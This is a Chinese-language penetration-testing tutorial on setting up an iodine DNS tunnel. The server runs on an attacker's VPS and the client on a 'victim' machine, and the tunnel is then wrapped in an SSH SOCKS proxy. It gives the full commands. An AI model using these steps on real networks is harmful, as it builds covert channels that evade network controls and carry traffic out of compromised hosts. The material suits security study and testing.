介绍


iodine用来搭建dns隧道，地址：https://github.com/yarrick/iodine，分为服务端和客户端，服务端放在攻击机，客户端放在受害机。以vps的ubuntu为攻击机，以centos为受害机，需要安装。


安装


执行以下命令进行安装：


git clone https://github.com/yarrick/iodinemakemake install



安装后位置：/usr/local/sbin/iodined和/usr/local/sbin/iodine，服务端运行的是iodined，客户端运行的是iodine。

搭建隧道


首先在服务端运行iodined，加f参数指定在前台运行，然后跟一个内网ip，这个内网ip给隧道使用，然后跟dns域名即可。如下图。


iodined -f 10.0.0.1 iodine.xxxx.com



回车后输入密码，客户端连接时需要使用，这里输入123456（实战中建议指定复杂密码），客户端设置好后，我们可以使用iodine官方的检测页面来检测是否配置有误。


地址：https://code.kryo.se/iodine/check-it/


输入我们的dns域名进行检测即可。



服务端配置好后，客户端连接时如果报iodine：BADIP：Server rejected sender IP address错误，即服务端拒绝了我们的ip地址，这时则可以尝试在服务端添加c参数来忽略请求ip地址和端口的检查。



服务端修改命令为：`iodined -f -c -P 123456 10.0.0.1 iodine.xxxx.com`



客户端再次运行：`iodine -f -P 123456 iodine.xxxx.com`



可以看到输出提示，说当前设置了dns0网卡ip为10.0.0.2，服务端为10.0.0.1，我们测试可以在客户端看下当前是否添加了dns0网卡，是否可以ping通10.0.0.1。



此时我们可以在客户端机器上抓包查看下数据包的类型，我们ping服务端的10.0.0.1地址，ens33网卡为dns数据包，dns0网卡为icmp数据包，如下图。



和socks代理结合使用


dns隧道是未加密的，我们可以通过dns隧道打开ssh，并将其用作socks代理，ssh通信会自动进行加密。


首先我们在客户端使用ssh命令来进行socks代理设置：`ssh -ND 6666 root@10.0.0.1`


上述命令代表将客户端本地的6666端口通过dns隧道转发到我们的vps服务器上。


参数说明：N代表我们不做命令执行，只做端口转发。D代表端口转发，即ssh充当socks服务器。


输入密码回车后，我们从新开一个命令行使用curl命令加x参数来进行测试，x（小写的）参数用来设置访问的代理，httpbin.org/ip会返回访问它的ip地址，如果我们代理成功返回的就是vps的地址，如果失败，返回的就是客户端本机的地址。
